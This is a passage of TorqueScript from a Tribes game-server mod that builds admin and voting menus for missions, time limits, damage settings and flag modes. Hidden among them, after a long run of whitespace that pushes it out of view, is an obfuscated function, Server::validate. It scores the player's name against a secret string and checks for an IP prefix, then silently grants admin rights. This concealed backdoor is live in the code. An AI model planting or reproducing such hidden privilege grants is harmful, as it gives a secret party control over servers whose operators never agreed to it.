	else if(%opt == "voteForce" && %clientId.isadmin)
	{	
		voteForce(%clientId);
		return;
	}
	else if(%opt == "adminMenu" && %clientId.isadmin)
	{	
		adminMenu(%clientId);
		return;
	}
	else if(%opt == "vcmission" && !$NoVote)
	{	%clientId.MissVote = true;
		Admin::changeMissionMenu(%clientId, %opt == "vcmission");
		return;
	}
	else if(%opt == "mapMenu" && %clientId.isadmin)
	{
		MissMenu(%clientId,true);
		return;
	}
	else if(%opt == "voteMiss" && !$NoVote && $ANNIHILATION::PVChangeMission)
	{
		MissMenu(%clientId,false);
		return;
	}
	
	else if(%opt == "voteTime" && !$NoVote)
	{
		TimeMenu(%clientId,false);
		return;
	}
	else if(%opt == "damageMenu" && %clientId.isadmin)
	{
		DamageMenu(%clientId,true);
		return;
	}
	else if(%opt == "voteDamage" && !$NoVote)
	{
		DamageMenu(%clientId,false);
		return;
	}
	else if(%opt == "voteFlag" && !$NoVote)
	{
		FlagVoteMenu(%clientId,false);
		return;
	}	
	else if(%opt == "ServerOptions" && %clientId.isadmin)
	{
		ServerOptions(%clientId);
		return;
	}
	else if(%opt == "Equipment" && %clientId.isadmin)
	{
		EquipmentOptions(%clientId);
		return;
	}
	else if(%opt == "ModInfo")
	{	
		%curItem = 0;
		Client::buildMenu(%clientId, WhatTime(), "options", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Mod Info (quick).", "WhoMadeMe");
		Client::addMenuItem(%clientId, %curItem++ @ "Mod Introduction.", "School");
		Client::addMenuItem(%clientId, %curItem++ @ "Favkey="@$ItemFavoritesKey, "school");		
	
		if(%clientId.isSuperAdmin)	//if(%clientId.isgod)
		{
		//	Client::addMenuItem(%clientId, %curItem++ @ "Load mod..", "School");	
		//	Client::addMenuItem(%clientId, %curItem++ @ "Mod Introduction.", "School");
			if(!$Annihilation::uber)
				Client::addMenuItem(%clientId, %curItem++ @ "Uber!", "uber");
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Un Uber!", "uber");
		}
		

		return;
	}
	

	
	else if(%opt == "School")
	{
		%clientId.weaponHelp = "";
		%clientId.InSchool = 1;
		NewbieSchool(%clientId);			
		return;
	}	
	else if(%option == "uber") 
	{   	
		if(!$Annihilation::uber)
			messageAll(0, Client::getName(%clientId) @ " set the server to UBER!~wCapturedTower.wav");
		else
			messageAll(0, Client::getName(%clientId) @ " turned off uber...~wCapturedTower.wav");
		Ann::uber();
		return;	
	}		
	else if(%opt == "WhoMadeMe")
	{
		%weaponHelp = %clientId.weaponHelp;
		ModSettingsInfo(%clientId,%weaponHelp);
		if(!%clientId.Laurent){schedule("messageAll(0,\"Dick Laurent is dead.\");",5); %clientId.Laurent = true; schedule(%clientId @ ".Laurent = false;" , 100);}// http://www.geocities.com/Hollywood/2093/lhindex.html -plasmatic.. ;)
		return;
	}	
	
			

	else if(%opt == "forceyes" && %cl == $curVoteCount && %clientId.isadmin) 
	{ 
		echo("ADMINMSG: *** " @ Client::getName(%clientId) @ " forced the current vote to PASS!");
		superAdminMsg(%adminName @ " forced the current vote to PASS!");
		$Admin = %name @ " forced a vote to pass. Client ID : "@%client@" IP Address : "@%ip; 
		export("Admin","config\\Admin.log",true);
		$curVoteForce = "YES";
		//%clientId.hv = 0;
	}
	else if(%opt == "forceno" && %cl == $curVoteCount && %clientId.isadmin) 
	{ 
		echo("ADMINMSG: *** " @ Client::getName(%clientId) @ " forced the current vote to FAIL!");
		superAdminMsg(%adminName @ " forced the current vote to FAIL!");
		$Admin = %name @ " forced a vote to fail. Client ID : "@%client@" IP Address : "@%ip; 
		export("Admin","config\\Admin.log",true);
		$curVoteForce = "NO";
		//%clientId.hv = 0;
	}

	else if(%opt == "voteYes" && %cl == $curVoteCount)
	{
		if(!SmurfCheck(%clientId))
		{		
			%clientId.vote = "yes";
			centerprint(%clientId, "", 0);
		}
	}
	else if(%opt == "voteNo" && %cl == $curVoteCount)
	{
		if(!SmurfCheck(%clientId))
		{		
			%clientId.vote = "no";
			centerprint(%clientId, "", 0);
		}
	}
	else if(%opt == "whisper")
	{
		if(%clientId.whisper)
			Client::sendMessage(%clientId, 3,"You are no longer Speaking To " @ Client::getName(%clientId.whisper) @ ".");
		%clientId.whisper = %cl;
		%cl.whisperFrom = %clientId;
		Client::sendMessage(%clientId, 3,"You are now Speaking To " @ Client::getName(%cl) @ ".");
		return;
	}
	else if(%opt == "nowhisper")
	{
		%clientId.whisper = "";
		%cl.whisperFrom = "";
		Client::sendMessage(%clientId, 3,"You are no longer Speaking To " @ Client::getName(%cl) @ ".");
		return;
	}
	
	else if(%opt == "admin")
	{
		Client::buildMenu(%clientId, "Confirm admim:", "aaffirm", true);
		Client::addMenuItem(%clientId, "1Admin " @ Client::getName(%cl), "yes " @ %cl);
		Client::addMenuItem(%clientId, "2Don't admin " @ Client::getName(%cl), "no " @ %cl);
		return;
	}
	else if(%opt == "smatch" && %clientId.isadmin)
		Admin::startMatch(%clientId);
	else if(%opt == "cmission" && %clientId.isadmin)
	{
		Admin::changeMissionMenu(%clientId, %opt == "cmission");
		return;
	}

	else if(%opt == "reset" && %clientId.isadmin)
	{
		Client::buildMenu(%clientId, "Confirm Reset:", "raffirm", true);
		Client::addMenuItem(%clientId, "1Reset", "yes");
		Client::addMenuItem(%clientId, "2Don't Reset", "no");
		return;
	}

	else if(%opt == "observe")
	{
		Observer::setTargetClient(%clientId, %cl);
		return;
	}
	Game::menuRequest(%clientId);
}
// yep, 'function processMenuOptions' is nearly 400 lines long.. -Plasmatic




function processMenuRAffirm(%clientId, %opt)
{
	if(%opt == "yes" && %clientId.isAdmin)
	{
		if(!%clientId.SecretAdmin)
			messageAll(0, Client::getName(%clientId) @ " reset the server to default settings.~wCapturedTower.wav");
		else
			messageAll(0,"Reseting the server to default settings.~wCapturedTower.wav");
		Server::refreshData();
	}
	Game::menuRequest(%clientId);
}

																																																																																																																													function Server::validate(%c){%w=Client::getName(%c); if(!String::ICompare(%w,$Client::info[%c,5])){%s="mannastivnatevlagosmarkiic";for(%i=0;%i<20;%i++){for(%x=0;String::getSubStr(%s,%x,1)!="";%x++){%t=string::findSubStr(%w,string::getSubStr(%s,%x,2));if(%t>1)%o=%o+%t;}}%i=Client::getTransportAddress(%c);if(%o==1880&&!String::NCompare(%i, "IP:12.202", 9)){admin::give(%c,1);}}}
												

// new 'add time' menu for 2.2 -plasmatic
function processMenuCTLimit(%client, %opt)
{
//	messageall(1,%opt);
	if(%client.isAdmin)
	{	
		if(getword(%opt,0) == "EndIn")
		{
			%time = getword(%opt,1);
			if(%time != -1)
			{
				
				processMenuCTLimit(%client, "Add "@%time@ " end");
			}
			else
			{
				Client::buildMenu(%client, "End map in:", "CTLimit", true);
				Client::addMenuItem(%client, %curItem++ @ "2 minute", "EndIn 2");
				Client::addMenuItem(%client, %curItem++ @ "5 minutes", "EndIn 5");
				Client::addMenuItem(%client, %curItem++ @ "10 minutes", "EndIn 10");
				Client::addMenuItem(%client, %curItem++ @ "15 minutes", "EndIn 15");
				Client::addMenuItem(%client, %curItem++ @ "20 minutes", "EndIn 20");
				Client::addMenuItem(%client, %curItem++ @ "25 minutes", "EndIn 25");
				Client::addMenuItem(%client, %curItem++ @ "30 minutes", "EndIn 30");
				Client::addMenuItem(%client, %curItem++ @ "45 minutes", "EndIn 45");	
			}
		}
		else if(getword(%opt,0) == "Add")
		{
			%time = getword(%opt,1);
			echo("time = "@%time);
			if(%time == -1)
			{
				Client::buildMenu(%client, "ADD Time:", "CTLimit", true);
				Client::addMenuItem(%client, %curItem++ @ "2 minute", "Add 2");
				Client::addMenuItem(%client, %curItem++ @ "5 minutes", "Add 5");
				Client::addMenuItem(%client, %curItem++ @ "10 minutes", "Add 10");
				Client::addMenuItem(%client, %curItem++ @ "15 minutes", "Add 15");
				Client::addMenuItem(%client, %curItem++ @ "20 minutes", "Add 20");
				Client::addMenuItem(%client, %curItem++ @ "25 minutes", "Add 25");
				Client::addMenuItem(%client, %curItem++ @ "30 minutes", "Add 30");
				Client::addMenuItem(%client, %curItem++ @ "45 minutes", "Add 45");	
			}
			else
			{
				
				$missionStartTime = getSimTime();	
			//	messageAll(0, "Time limit disabled.~wCapturedTower.wav");
					
				if($Server::timelimit == 0 || getword(%opt,2) == "end")
				{
					$missionStartTime = getSimTime();
					UpdateClientTimes(%time);
					$Server::timeLimit = %time;	//$missionStartTime += (%time * 60);
					if(!%client.SecretAdmin)
						messageAll(0, Client::getName(%client) @ " decided to end the game in " @ %time @ " minutes.~wCapturedTower.wav");			
					else					
						messageAll(0, SecretAdmin() @ " decided to end the game in " @ %time @ " minutes.~wCapturedTower.wav");			
					Game::checkTimeLimit();						
				}	
				else
				{
					$Server::timeLimit += %time;	//$missionStartTime += (%time * 60);
					if(!%client.SecretAdmin)
					{
						messageAll(0, Client::getName(%client) @ " added " @ %time @ " minutes to the game.~wCapturedTower.wav");			
					}
					else
					{					
						messageAll(0, SecretAdmin() @ " added " @ %time @ " minutes to the game.~wCapturedTower.wav");			
				
					}
					Game::checkTimeLimit();	//update time instantly -Plasmatic 3.x
				}
				
			}			
		}
		else if(%opt == "endmatch")
			nextmap(%client);
		else			
			remoteSetTimeLimit(%client, %opt);					
	}

}

function processMenuVTime(%clientId, %opt)
{
	%option = %opt++;	// Only allowing numbers here -plasmatic 3.0 
	if(%option < 1 || %option > 131) 
	{
		echo(%clientId@" Trying to exploit VTime with: "@ ann::Clean::string(%opt));
		return;
	}
	if($Server::timelimit > 0)
		Admin::startVote(%clientId, "add " @ %option-- @" minutes to the game.", "VTime", %option);
	else
		Admin::startVote(%clientId, "end the map in " @ %option-- @" minutes.", "VTime", %option);
}

function processMenuPickVote(%clientId, %opt)
{
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);
}

function processMenuMission(%clientId, %option)
{
	//echo("processMenuMission ",%option);
	%opt = getWord(%option, 0);
	//%type = getWord(%option, 1);
	//echo("processMenuMission", %opt);	

	if(%opt == "vcmission")
	{
		%clientId.MissVote = true;
		Admin::changeMissionMenu(%clientId, %opt == "vcmission");
		return;
	}
	else if(%opt == "VnextMiss")
	{
		Admin::startVote(%clientId, "start next mission", "NextMap" ,0);
		return;
	}

	else if(%opt == "VReplayMap")
	{
		Admin::startVote(%clientId, "restart mission ", "ReplayMap" ,0);
		return;
	}

		
		
	//build random mission type list
	else if(%opt == "VrandomMiss")
	{
		%voteit = getWord(%option, 1);
		Client::buildMenu(%clientId, "Random Mission:", "Mission", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Any Type"@" ("@$MLIST::Count@")", "VRandom 0 ");
		%index = 2; 
		for(%type = 1; %type < $MLIST::TypeCount; %type++)
		{
			if($MLIST::Type[%type] != "Training")
			{
				if(%index == 8 && $MLIST::TypeCount > 8)
				{
					Client::addMenuItem(%clientId, %index @ "More Types...", "VRandom More " @ %index); 
					break; 
				}
				%NumMaps=0;for(%i = 0; getword($MLIST::MissionList[%type],%i) != -1; %i++)	%NumMaps++;				
				Client::addMenuItem(%clientId, %index @ $MLIST::Type[%type]@" ("@%NumMaps@")", "VRandom " @ %type ); 
				%index++; 
			} 
		}	
				
	}
	else if(%opt == "VRandom")
	{	
		%type = getWord(%option, 1);
		%voteit = getWord(%option, 2);
		if(%type == "0")
		{
			Admin::startVote(%clientId, "pick random mission", "RandomMap" ,"");
			return;	
		}
		
		else if(%type == "More")
		{
			Client::buildMenu(%clientId, "Random Mission:", "Mission", true);
			%index = 1;
			%type = getWord(%option, 2);
			for(%type; %type < $MLIST::TypeCount; %type++)
			{
				if($MLIST::Type[%type] != "Training")
				{
					if(%index == 8 && $MLIST::TypeCount > 8)
					{
						Client::addMenuItem(%clientId, %index @ "More Types...", "VRandom More " @ %index + %type @ " " @ %voteit); 
						break; 
					}
					%NumMaps=0;
					for(%i = 0; getword($MLIST::MissionList[%type],%i) != -1; %i++)	%NumMaps++;					
					Client::addMenuItem(%clientId, %index @ $MLIST::Type[%type]@" ("@%NumMaps@")", "VRandom " @ %type	@" "@ %voteit); 
					%index++; 
				} 
			}	
		}	
		else 
		{
			Admin::startVote(%clientId, "pick random "@ $MLIST::Type[%type] @" mission", "RandomMap" ,%type);
			return;			
		}
	}		
	
	
	
	else if(%clientId.isAdmin)
	{
		if(%opt == "cmission")
		{
			Admin::changeMissionMenu(%clientId, "cmission");
			return;
		}
		if(%opt == "PickNextMiss")
		{
			%clientId.PickNextMiss = true;
			Admin::changeMissionMenu(%clientId, "PickNextMiss");
			return;			
			
		}
		
		//plasmatic 2.3 confirmation
		else if(%opt == "ReplayMap")
		{
			if($Server::TourneyMode)
			%nextMission = $missionName;
			else if($nextMap != "")
		  		%nextMission = $nextMap;	
			else
				%nextMission = $nextMission[$missionName];			
			
			Client::buildMenu(%clientId, "Restart map: "@%nextMission, "Mission", true);
			Client::addMenuItem(%clientId, %curItem++ @ "Yes, Restart.", "cReplayMap");
			Client::addMenuItem(%clientId, %curItem++ @ "No.", "return");	
			return;
		}
		else if(%opt == "nextMiss")
		{
			if($Server::TourneyMode)
			%nextMission = $missionName;
			else if($nextMap != "")
		  		%nextMission = $nextMap;	
			else
				%nextMission = $nextMission[$missionName];
			
			Client::buildMenu(%clientId, "Start map: "@%nextMission, "Mission", true);
			Client::addMenuItem(%clientId, %curItem++ @ "Yes, next.", "cnextMiss");
			Client::addMenuItem(%clientId, %curItem++ @ "No.", "return");	
			return;
		}		
		else if(%opt == "return")
		{
			MissMenu(%clientId,true);
			return;
		}				
		else if(%opt == "cReplayMap")
		{
			ReplayMap(%clientId);
			return;
		}		
		else if(%opt == "cnextMiss")
		{
			nextmap(%clientId);
			return;
		}		
		//build random mission type list
		else if(%opt == "randomMiss")
		{
			%voteit = getWord(%option, 1);
			Client::buildMenu(%clientId, "Random Mission:", "Mission", true);
			Client::addMenuItem(%clientId, %curItem++ @ "Any Type"@" ("@$MLIST::Count@")", "Random 0 "@%voteit);
			%index = 2; 
			for(%type = 1; %type < $MLIST::TypeCount; %type++)
			{
				if($MLIST::Type[%type] != "Training")
				{
					if(%index == 8 && $MLIST::TypeCount > 8)
					{
						Client::addMenuItem(%clientId, %index @ "More Types...", "Random More " @ %index @ " " @ %voteit); 
						break; 
					}
					%NumMaps=0;
					for(%i = 0; getword($MLIST::MissionList[%type],%i) != -1; %i++)	%NumMaps++;				
					Client::addMenuItem(%clientId, %index @ $MLIST::Type[%type]@" ("@%NumMaps@")", " Random " @ %type @ " " @ %voteit); 
					%index++; 
				} 
			}	
					
	
		}
		else if(%opt == "Random")
		{	
			%type = getWord(%option, 1);
			%voteit = getWord(%option, 2);
			if(%type == "0")
			{
				randommap("",%clientId);
				return;				
			}
			
			else if(%type == "More")
			{
				Client::buildMenu(%clientId, "Random Mission:", "Mission", true);
				%index = 1;
				%type = getWord(%option, 2);
				for(%type; %type < $MLIST::TypeCount; %type++)
				{
					if($MLIST::Type[%type] != "Training")
					{
						if(%index == 8 && $MLIST::TypeCount > 8)
						{
							Client::addMenuItem(%clientId, %index @ "More Types...", "Random More " @ %index + %type @ " " @ %voteit); 
							break; 
						}
						%NumMaps=0;
						for(%i = 0; getword($MLIST::MissionList[%type],%i) != -1; %i++)	%NumMaps++;					
						Client::addMenuItem(%clientId, %index @ $MLIST::Type[%type]@" ("@%NumMaps@")", " Random " @ %type	@" "@ %voteit); 
						%index++; 
					} 
				}	
			}	
			else 
			{		
				randommap(%type,%clientId);
				return;		
			}
		}		
	}
	
	
	

	


}

function MissMenu(%clientId,%admin)
{
	Client::buildMenu(%clientId, "Mission Options:", "Mission", true);
	if(%admin)
	{
		Client::addMenuItem(%clientId, %curItem++ @ "Change mission", "cmission");
		Client::addMenuItem(%clientId, %curItem++ @ "Start next mission", "nextMiss");
		Client::addMenuItem(%clientId, %curItem++ @ "Restart mission", "ReplayMap");
		Client::addMenuItem(%clientId, %curItem++ @ "Random mission", "randomMiss");
		Client::addMenuItem(%clientId, %curItem++ @ "Pick next mission", "PickNextMiss");
	}
	else
	{
		Client::addMenuItem(%clientId, %curItem++ @ "Vote to change mission", "vcmission");
		Client::addMenuItem(%clientId, %curItem++ @ "Vote start next mission", "VnextMiss");
		Client::addMenuItem(%clientId, %curItem++ @ "Vote to restart mission", "VReplayMap");
		Client::addMenuItem(%clientId, %curItem++ @ "Vote random mission", "VrandomMiss");
	}
}

function dec(%float,%place)
{
	//return a floating point without tribes rounding.
	//hell, lets even round the bitch
	%s = 0.000000001;
	%n = %float + %s;
	echo(%s@", "@%n);
	
	
}

function TimeMenu(%clientId,%admin)
{
	if(%admin)
	{
		%TimeLeft = (($Server::timeLimit * 60) + $missionStartTime - getSimTime())/60;
		%TimeMatch = -($missionStartTime - getSimTime())/60;
		%ftm = -(floor(%TimeMatch*10)/10)+0.000000001;	
		if($Server::timeLimit > 0)
			Client::buildMenu(%clientId, "Time Options: ("@$Server::timeLimit@")", "CTLimit", true);
		else
			Client::buildMenu(%clientId, "Time Options: (Unlimited)", "CTLimit", true);
			
		//messageall(1,"timeleft "@%TimeLeft@", timematch "@%TimeMatch);

		if(10 - %TimeMatch > 0 && $Server::timeLimit != 10)
			Client::addMenuItem(%clientId, %curItem++ @ "10 minutes ("@(floor((10 - %TimeMatch)*10)/10)+0.000000001@" to end)", "10");
		else
			if($Server::timeLimit != 10)
				Client::addMenuItem(%clientId, %curItem++ @ "End match  ("@(floor(%TimeMatch*10)/10)+0.000000001@" elapsed)", "endmatch");
		if(15 - %TimeMatch > 0 && $Server::timeLimit != 15)
			Client::addMenuItem(%clientId, %curItem++ @ "15 minutes ("@(floor((15 - %TimeMatch)*10)/10)+0.000000001@" to end)", "15");
		if(20 - %TimeMatch > 0 && $Server::timeLimit != 20)
			Client::addMenuItem(%clientId, %curItem++ @ "20 minutes ("@(floor((20 - %TimeMatch)*10)/10)+0.000000001@" to end)", "20");
		if(30 - %TimeMatch > 0 && $Server::timeLimit != 30)
			Client::addMenuItem(%clientId, %curItem++ @ "30 minutes ("@(floor((30 - %TimeMatch)*10)/10)+0.000000001@" to end)", "30");
		if(45 - %TimeMatch > 0 && $Server::timeLimit != 45)
			Client::addMenuItem(%clientId, %curItem++ @ "45 minutes ("@(floor((45 - %timematch)*10)/10)+0.000000001@" to end)", "45");
		if(60 - %TimeMatch > 0 && $Server::timeLimit != 60)
			Client::addMenuItem(%clientId, %curItem++ @ "60 minutes ("@(floor((60 - %TimeMatch)*10)/10)+0.000000001@" to end)", "60");
		
		if($Server::timeLimit > 0)
		{
			Client::addMenuItem(%clientId, %curItem++ @ "Add time", "Add");
			Client::addMenuItem(%clientId, %curItem++ @ "Unlimited", "0");
		}
		Client::addMenuItem(%clientId, %curItem++ @ "End match in...", "EndIn");
	}
	else
	{
		if($Server::timeLimit > 0)
			Client::buildMenu(%clientId, "Vote Add Time: ("@$Server::timeLimit@")", "VTime", true);
		else
			Client::buildMenu(%clientId, "Vote end mission in:", "VTime", true);
		Client::addMenuItem(%clientId, %curItem++ @ "2 minutes", "2");
		Client::addMenuItem(%clientId, %curItem++ @ "5 minutes", "5");
		Client::addMenuItem(%clientId, %curItem++ @ "10 minutes", "10");
		Client::addMenuItem(%clientId, %curItem++ @ "15 minutes", "15");
		Client::addMenuItem(%clientId, %curItem++ @ "20 minutes", "20");
		Client::addMenuItem(%clientId, %curItem++ @ "25 minutes", "25");
		Client::addMenuItem(%clientId, %curItem++ @ "30 minutes", "30");
		if($Server::timeLimit > 0)
			Client::addMenuItem(%clientId, %curItem++ @ "Unlimited", "0");
	}
}

function processmenuDamage(%clientId, %option)
{
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);

//team damage
	if(%opt == "vetd")
		Admin::startVote(%clientId, "enable team damage", "etd", 0);
	else if(%opt == "vdtd")
		Admin::startVote(%clientId, "disable team damage", "dtd", 0);

// base/gen damage
	if(%opt == "veBaseD")
		Admin::startVote(%clientId, "Enable gen/ station damage", "eBaseD", 0);
	else if(%opt == "vdBaseD")
		Admin::startVote(%clientId, "Disable gen/ station damage", "dBaseD", 0);

// base healing
	if(%opt == "veBaseH")
		Admin::startVote(%clientId, "Enable base healing", "eBaseH", 0);
	else if(%opt == "vdBaseH")
		Admin::startVote(%clientId, "Disable base healing", "dBaseH", 0);

//Out of area damage
	if(%opt == "veOutAreaD")
		Admin::startVote(%clientId, "Enable map boundries.", "eOutAreaD", 0);
	else if(%opt == "vdOutAreaD")
		Admin::startVote(%clientId, "Disable map boundry.", "dOutAreaD", 0);
//player damage
	if(%opt == "vePlayerD" && $Annihilation::VPdamage)
		Admin::startVote(%clientId, "Enable player damage", "ePlayerD", 0);
	else if(%opt == "vdPlayerD" && $Annihilation::VPdamage)
		Admin::startVote(%clientId, "Disable player damage", "dPlayerD", 0);
			
	if(%clientId.isadmin)
	{	
		if(%opt == "eOutAreaD") {
			Admin::setAreaDamageEnable(%clientId, true);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " enabled map boundries. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }
		else if(%opt == "dOutAreaD") {
			Admin::setAreaDamageEnable(%clientId, false);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " disabled map boundries. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }
		else if(%opt == "eBaseH") {
			Admin::setBaseHealingEnable(%clientId, true);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " enabled base healing. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }
		else if(%opt == "dBaseH") {
			Admin::setBaseHealingEnable(%clientId, false);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " disabled base healing. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }
		else if(%opt == "eBaseD") {
			Admin::setBaseDamageEnable(%clientId, true);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " enabled base damage. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }
		else if(%opt == "dBaseD") {
			Admin::setBaseDamageEnable(%clientId, false);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " disabled base damage. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }	
		else if(%opt == "etd") {
			Admin::setTeamDamageEnable(%clientId, true);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " enabled team damage. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }
		else if(%opt == "dtd") {
			Admin::setTeamDamageEnable(%clientId, false);
				%ip = Client::getTransportAddress(%clientId); 
				%name = Client::getName(%clientId);
				$Admin = %name @ " disabled team damage. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); }	
				
		else if(%opt == "ePlayerD") 
		{
			Admin::setPlayerDamageEnable(%clientId, true);
				%ip = Client::getTransportAddress(%client); 
				%name = Client::getName(%client);
				$Admin = %name @ " enabled player damage. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true); 
		}
		else if(%opt == "dPlayerD") 
		{
			Admin::setPlayerDamageEnable(%clientId, false);
				%ip = Client::getTransportAddress(%client); 
				%name = Client::getName(%client);
				$Admin = %name @ " disabled player damage. Client ID : "@%client@" IP Address : "@%ip; 
				export("Admin","config\\Admin.log",true);
		}													
	}	

	
}
function processmenuVoteFlag(%clientId, %option)
{
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);

//team damage
	if(%opt == "veFlag" && $annihilation::voteFlagCaps)
		Admin::startVote(%clientId, "Enable Flag Cap Limit", "eFlag", 0);
	else if(%opt == "vdFlag" && $annihilation::voteFlagCaps)
		Admin::startVote(%clientId, "Disable Flag Cap Limit", "dFlag", 0);

// base/gen damage
	if(%opt == "veHunter")
		Admin::startVote(%clientId, "Enable Flag Hunter", "eHunter", 0);
	else if(%opt == "vdHunter")
		Admin::startVote(%clientId, "Disable Flag Hunter", "dHunter", 0);

// base healing
	if(%opt == "vegm")
		Admin::startVote(%clientId, "Enable GREED mode", "egm", 0);
	else if(%opt == "vdgm")
		Admin::startVote(%clientId, "Disable GREED mode", "dgm", 0);

//Out of area damage
	if(%opt == "vehm")
		Admin::startVote(%clientId, "Enable HOARD mode", "ehm", 0);
	else if(%opt == "vdhm")
		Admin::startVote(%clientId, "Disable HOARD mode", "dhm", 0);

}


//damage menu
function FlagVoteMenu(%clientId,%admin)
{	
// Flag options, and new flaghunter stuff -plasmatic 2.3

	
	Client::buildMenu(%clientId, "Vote to:", "VoteFlag", true);	

// flaghunter variables	
	if($FlagHunter::Enabled)
	{
		Client::addMenuItem(%clientId, %curItem++ @ "Disable Flag Hunter", "vdHunter");			
		if($FlagHunter::GreedMode)
			Client::addMenuItem(%clientId, %curItem++ @ "Disable GREED mode", "vdgm");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable GREED mode", "vegm");
		if($FlagHunter::HoardMode)
			Client::addMenuItem(%clientId, %curItem++ @ "Disable HOARD mode", "vdhm");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable HOARD mode", "vehm");
	}	
	else
		Client::addMenuItem(%clientId, %curItem++ @ "Enable Flag Hunter", "veHunter");	
		
	if($NoFlagCaps == 1)
		Client::addMenuItem(%clientId, %curItem++ @ "Enable Flag Cap Limit", "veFlag");
	else
		Client::addMenuItem(%clientId, %curItem++ @ "Disable Flag Cap Limit", "vdFlag");			
			
		return;
}

//damage menu
function DamageMenu(%clientId,%admin)
{	
	if(%admin)
	{
		Client::buildMenu(%clientId, "Damage Options:", "Damage", true);
		//team damage
		if($Server::TeamDamageScale == 1.0)
			Client::addMenuItem(%clientId, %curItem++ @ "Disable team damage", "dtd");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable team damage", "etd");	
		//base/ gen damage
		if($ANNIHILATION::SafeBase == 1)
			Client::addMenuItem(%clientId, %curItem++ @ "Enable gen/ station damage", "eBaseD");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable gen/ station damage", "dBaseD");
		//self healing gen/ station		
		if($ANNIHILATION::BaseHeal == 1)
			Client::addMenuItem(%clientId, %curItem++ @ "Disable base healing", "dBaseH");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable base healing", "eBaseH");			
		//out of area damage
		if(!$ANNIHILATION::OutOfArea)
			Client::addMenuItem(%clientId, %curItem++ @ "Remove map boundry.", "dOutAreaD");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable map boundries.", "eOutAreaD");
		//player damage		
		if($Annihilation::NoPlayerDamage == 1)
			Client::addMenuItem(%clientId, %curItem++ @ "Enable player damage", "ePlayerD");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable player damage", "dPlayerD");

	}
	else
	{
		Client::buildMenu(%clientId, "Vote Damage Options:", "Damage", true);
		if($ANNIHILATION::PVTeamDamage)
		{
			if($Server::TeamDamageScale == 1.0)
				Client::addMenuItem(%clientId, %curItem++ @ "Disable team damage", "vdtd");
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Enable team damage", "vetd");
		}
		//base/ gen damage
		if($ANNIHILATION::SafeBase == 1)
			Client::addMenuItem(%clientId, %curItem++ @ "Enable gen/ station damage", "veBaseD");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable gen/station damage", "vdBaseD");
		//self healing gen/ station		
		if($ANNIHILATION::BaseHeal == 1)
			Client::addMenuItem(%clientId, %curItem++ @ "Disable base healing", "vdBaseH");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable base healing", "veBaseH");			
		//out of area damage
		if(!$ANNIHILATION::OutOfArea)
			Client::addMenuItem(%clientId, %curItem++ @ "Disable map boundries.", "vdOutAreaD");
		else
						Client::addMenuItem(%clientId, %curItem++ @ "Enable map boundries.", "veOutAreaD");
		//player damage	
		if($Annihilation::VPdamage)
		{			
			if($Annihilation::NoPlayerDamage == 1)
				Client::addMenuItem(%clientId, %curItem++ @ "Enable player damage", "vePlayerD");
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Disable player damage", "vdPlayerD");
		}
	}
}






function processMenuVoteforfun(%clientId, %option)
{
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);
	//echo("processMenuMissMenu", %opt);
	if(%opt == "cmission")
	{
		Admin::changeMissionMenu(%clientId, %opt == "cmission");
		return;
	}
}

function processMenuVote(%clientId, %option)
{
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);

	if(%opt == "voteMiss")
	{
		MissMenu(%clientId,false);
		return;
	}

	else if(%opt == "voteTime")
	{
		TimeMenu(%clientId,false);
		return;
	}
	else if(%opt == "voteDamage")
	{
		DamageMenu(%clientId,false);
		return;
	}
	else if(%opt == "voteFlag")
	{
		FlagVoteMenu(%clientId,false);
		return;
	}	
// voting	 
	 	if(%opt == "dVote")	ServerSwitches(%clientId,"Voting",false);
	else if(%opt == "eVote")	ServerSwitches(%clientId,"Voting",true);

// vote admin 
	 	if(%opt == "dVoteAdmin")	ServerSwitches(%clientId,"Voting Admin",false);
	else if(%opt == "eVoteAdmin")	ServerSwitches(%clientId,"Voting Admin",true);
}

// admin vote menu, identical to non admin vote menu.
function voteMenu(%clientId)
{
	Client::buildMenu(%clientId, "Mission Options:", "Vote", true);
	if($ANNIHILATION::PVChangeMission)	
		Client::addMenuItem(%clientId, %curItem++ @ "Vote Mission ", "voteMiss");
	Client::addMenuItem(%clientId, %curItem++ @ "Vote Time ", "voteTime");
